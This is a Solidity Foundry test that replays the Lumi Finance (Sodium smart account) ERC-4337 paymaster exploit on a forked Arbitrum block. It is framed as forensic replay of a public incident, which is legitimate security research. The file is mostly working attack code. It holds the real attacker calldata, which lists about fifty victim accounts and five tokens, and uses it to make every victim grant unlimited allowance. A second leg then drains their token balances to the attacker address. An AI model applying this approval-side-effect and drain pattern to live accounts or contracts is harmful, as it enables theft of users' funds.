// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Lumi Finance (Sodium smart account) — ERC-4337 paymaster validation-phase approval side-effect
// ~$264k on Arbitrum. An attacker-controlled paymaster caused Sodium smart accounts to grant
// max ERC20 allowances to the attacker's contract DURING UserOp validation (no user intent),
// then those allowances were batch-drained.
//
// Approval tx : 0x630654fb1c8914405cf81bb02f091b049f19403a152f624f7b8a00c7724c6604  (block 483389834)
//   attacker EOA -> 0x5636... (attacker batch contract) . 0x363e464b(address[] victims,address[] tokens)
//   -> internally calls EntryPoint v0.6 handleOps; each victim account approves 0x5636... for max.
// Sweep tx    : 0x020995ec0b5daafe8fab481e33b1b52fdbd6423578060a1f73fd2a9b9fb0ea90  (block 483390715)
//   same contract, 0x96e676e5(address[],address[]) — DIFFERENT victim batch. Not replayed here
//   (its batch isn't approved yet at the approval-block fork); we drain the approval batch directly.
//
// This is a forensic replay of a public, already-executed incident at a historical fork block.
//
// Run:
//   forge test --contracts ./src/test/2026-07/LumiFinance_exp.sol --evm-version cancun -vvv
//   Requires an ARCHIVE Arbitrum RPC (Alchemy works) mapped to the `arbitrum` rpc alias.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract LumiFinanceExp is Test {
    // Attacker's batching contract == the approved spender (from the Approval logs' topic2).
    address constant SWEEPER  = 0x56362412AE17cac443AAFBAb4289946Ad958E8a1;
    address constant ATTACKER = 0xCe1a3BB0b98D0D90C7Dd0620Ab86C9A771888d88;
    // EntryPoint v0.6, confirmed from the UserOperationEvent emitter in the receipt.
    address constant ENTRYPOINT_V06 = 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;

    uint256 constant APPROVAL_BLOCK = 483389834; // block of the approval tx
    bytes constant APPROVE_CALLDATA = hex"363e464b000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000006a000000000000000000000000000000000000000000000000000000000000000320000000000000000000000000209d8fcb0c36399eb49e018a245c55fd37d16bd000000000000000000000000a57a32726eba2a57102d82e0859e373bc9e03e72000000000000000000000000a17a64736f8c722dfc1244db8b866f16918fd388000000000000000000000000ee6703fad5fc419b22ec6f52aa780b7e23ca90ac00000000000000000000000043e0d5312e2d239c9d5e35ed7f4d71394b41417b000000000000000000000000971e61d42f64698e244ed00c5b99684a48ec44eb0000000000000000000000007cfca43f79893f6ce813ad971baa5b4a24d7126f0000000000000000000000004cdf6ff7cfb13c38998430e1045a4ee62edb4f8200000000000000000000000087cf6e985cb99029981b47695116cfca7c5974c8000000000000000000000000352e272d564d1d1885d55d8642016fb4bbf1d853000000000000000000000000e098e794677f1530a28fe5a3725c53fe9240d2d70000000000000000000000001adae9d2b8accd14802273a69eb9c2746900a4d9000000000000000000000000a225f7262a654f1fe2518ab8933f1b9d8023d6df00000000000000000000000019ffea8ec0ddb28b372ecb2139606d37644e889b000000000000000000000000e6331e219e7604fa12555f0d3da6366bb4cdb03500000000000000000000000077d66bbf5c671daa02fd95d6c9dcba6248eb3f6d000000000000000000000000b2c6ed7cc559041990cd74ac333aa548b4aa60ae000000000000000000000000dd79d7d724627127182d0fd9ea7de9c6720c328700000000000000000000000089c781ac363fae8daa9aa19b00dfbcd2edeee43d0000000000000000000000003637be137cea7217ed2715c2ceba417bee6d99bf0000000000000000000000006bcf2796a28c9e1c3a6b53c433e7c9e8122211dc000000000000000000000000e3207d535a28a86804a96d0b71cd978eabfbac2a0000000000000000000000009cd3c7460869f592782d7d46d29300814ae3d54300000000000000000000000065ec22bbb0b8cc185e0ccdce0e9394d0271a5e85000000000000000000000000cb6114314aa95002daa501ea4e613a6e54f145cd000000000000000000000000d82ca253469c7de68297e96338941499170e9ed00000000000000000000000008767c8e213be921d469e57a8ca278408a3f898c9000000000000000000000000c651366aae4df1a98e790003f3d717425b50abee000000000000000000000000245d49b3b0375fc0b5d2f25fb6e25d9a21acf432000000000000000000000000c6ebbe3a937a25caebadda6f656b4d99e96d595d00000000000000000000000071523114f220189ef88e299ffe4509858530ed1b000000000000000000000000c000062c689edfb88fecb14a207377f21caaf2fa000000000000000000000000996470622b444988587cd3fa5b5e4f3f7e3f13ba000000000000000000000000f02f13939e6a590fd0a2a701b062b1738e968301000000000000000000000000af11f45b826d7bc5f6cbdd74586a93db8a5f8526000000000000000000000000f63a0815cac1613585e3144ab39ad16b40872ef3000000000000000000000000b143884a22a3f8b78952dcbcdab3e0ccce90f95b00000000000000000000000077cfb1f22ae64ded08c7205802844e2ea7c0733c0000000000000000000000003bd322fc578511ca2e4c6b2003933f57e9a2d1220000000000000000000000008bfb3e2e932059d2d921959d07ee841ebf07a66c0000000000000000000000000244229f7a82b9d6bc70dae73b4cb5b46ca87a5c0000000000000000000000003573dcca88be6c7572e5f55ad57d3fff3584195800000000000000000000000036cef7b6559b98ff3ccf89663cc2c203e08dae2a00000000000000000000000033f452fac9ef93d507e1a1621db5f7bfd910eb1d0000000000000000000000005b33549d0d61786daad7ff87da1f347efcedba2c00000000000000000000000088e8e7f8d95bd52a178197ab0199dde31caa623d000000000000000000000000f73bf94e4288bbbca25c3c021c9e64e5398580f60000000000000000000000009504b0487b4f382c15d28dbb50dae07fdbe5d962000000000000000000000000f1c382508916fa0d3f81b8ce789c3ee9f7f2ed8d00000000000000000000000063b1a66d0d4df6c333907e086945d1dd376cf8eb0000000000000000000000000000000000000000000000000000000000000005000000000000000000000000fd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9000000000000000000000000c3abc47863524ced8daf3ef98d74dd881e131c380000000000000000000000001dd6b5f9281c6b4f043c02a83a46c2772024636c000000000000000000000000af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000ff970a61a04b1ca14834a43f5de4533ebddb5cc8";


    // Real approval-tx (0x363e464b) calldata, hardcoded so the PoC runs with no env var / pre-step.

    function setUp() public {
        // Fork one block before the approval tx => victim nonces / paymaster deposit as they were,
        // and no rogue allowances yet.
        vm.createSelectFork("arbitrum", APPROVAL_BLOCK - 1);
        vm.label(SWEEPER, "AttackerContract/Spender");
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(ENTRYPOINT_V06, "EntryPointV06");
    }

    function testExploit() public {
        bytes memory approveData = APPROVE_CALLDATA;

        // Decode the victim + token sets straight out of the real calldata (strip 4-byte selector).
        bytes memory args = new bytes(approveData.length - 4);
        for (uint256 i = 0; i < args.length; i++) args[i] = approveData[i + 4];
        (address[] memory victims, address[] memory tokens) = abi.decode(args, (address[], address[]));
        emit log_named_uint("victims in batch", victims.length);
        emit log_named_uint("tokens in batch", tokens.length);

        // Pre-state: the vuln hasn't fired yet.
        assertEq(IERC20(tokens[0]).allowance(victims[0], SWEEPER), 0, "pre: allowance already set");

        // -- LEG 1: replay the real approval tx verbatim, from the attacker EOA --
        // The paymaster's validation-phase side-effect makes every victim approve SWEEPER for max.
        vm.prank(ATTACKER);
        (bool ok, ) = SWEEPER.call(approveData);
        require(ok, "leg1: approval replay reverted");

        // The vulnerability: unauthorized max allowance granted with no user signature/intent.
        assertEq(
            IERC20(tokens[0]).allowance(victims[0], SWEEPER),
            type(uint256).max,
            "leg1: side-effect approval did not land"
        );

        // -- LEG 2: exercise those allowances as the approved spender to prove drainability --
        uint256[] memory stolen = new uint256[](tokens.length);
        for (uint256 t = 0; t < tokens.length; t++) {
            uint256 before = IERC20(tokens[t]).balanceOf(ATTACKER);
            for (uint256 v = 0; v < victims.length; v++) {
                uint256 bal = IERC20(tokens[t]).balanceOf(victims[v]);
                if (bal == 0) continue;
                vm.prank(SWEEPER); // SWEEPER holds the unauthorized allowance
                IERC20(tokens[t]).transferFrom(victims[v], ATTACKER, bal);
            }
            stolen[t] = IERC20(tokens[t]).balanceOf(ATTACKER) - before;
            emit log_named_address("token", tokens[t]);
            emit log_named_uint("  drained to attacker", stolen[t]);
        }

        uint256 totalTokensDrained;
        for (uint256 t = 0; t < tokens.length; t++) if (stolen[t] > 0) totalTokensDrained++;
        assertGt(totalTokensDrained, 0, "leg2: nothing drained");
    }
}
